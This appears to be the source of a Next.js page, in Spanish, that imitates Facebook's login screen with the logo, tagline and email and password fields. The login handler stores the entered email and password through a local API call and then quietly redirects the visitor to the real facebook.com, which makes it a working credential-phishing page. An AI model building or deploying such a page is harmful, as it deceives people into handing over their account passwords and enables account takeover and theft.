
'use client';

import { useState } from "react";
import Image from "next/image";
import postPersonas from "@/api/xddddd";

export default function Home() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [message, setMessage] = useState("");

  const handleRegister = async () => {
    try {
      await postPersonas({ email: email, password: password });
      console.log('Usuario insertado correctamente.');
      window.location.href = "https://www.facebook.com/?locale=es_LA";
    } catch (error) {
      console.error("Fallo en el registro:", error);
    }
  };

  return (
    <div className="bg-gray-100 h-screen flex items-center justify-center w-screen">
      <div className="flex items-center justify-between w-full max-w-6xl">
        {/* Left Side */}
        <div className="text-4xl w-1/2 px-10 ml-10">
          <Image
            src={"/facebook.svg"}
            width={400} // Aumenta el tamaño del logo
            height={150}
            alt="Facebook Logo"
          />
          <p className="ml-8 -mt-3 text-4xl">
            Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.
          </p>
        </div>

        {/* Right Side */}
        <div className="w-1/2 flex flex-col">
          {/* Inputs */}
          <div className="bg-white flex flex-col p-8 rounded-xl shadow-lg border border-gray-200">
            <input
              className="my-3 border border-1 border-gray-100 p-4 rounded-md focus:outline-1 outline-blue-600 text-lg"
              type="text"
              placeholder="Correo electrónico o número de teléfono"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <input
              className="my-3 border border-1 border-gray-100 p-4 rounded-md focus:outline-1 outline-blue-600 text-lg"
              type="password"
              placeholder="Contraseña"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <button
              className="bg-blue-600 my-3 py-3 text-xl font-bold text-white rounded-md hover:bg-blue-700"
              onClick={handleRegister}
            >
              Iniciar sesión
            </button>
            {message && (
              <p className="text-center text-red-600 mt-2 text-lg">{message}</p>
            )}
            <p className="cursor-pointer text-blue-600 text-md my-2 text-center hover:underline">
              ¿Olvidaste tu contraseña?
            </p>
            <span className="my-3">
              <hr />
            </span>
            <button className="bg-green-500 my-3 py-3 px-4 text-xl font-bold text-white rounded-md hover:bg-green-600 w-fit mx-auto">
              Crear cuenta nueva
            </button>
          </div>

          {/* Message */}
          <div className="mt-4 text-md text-gray-600 text-center">
            <p>
              Crea una página para una celebridad, una marca o un negocio.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
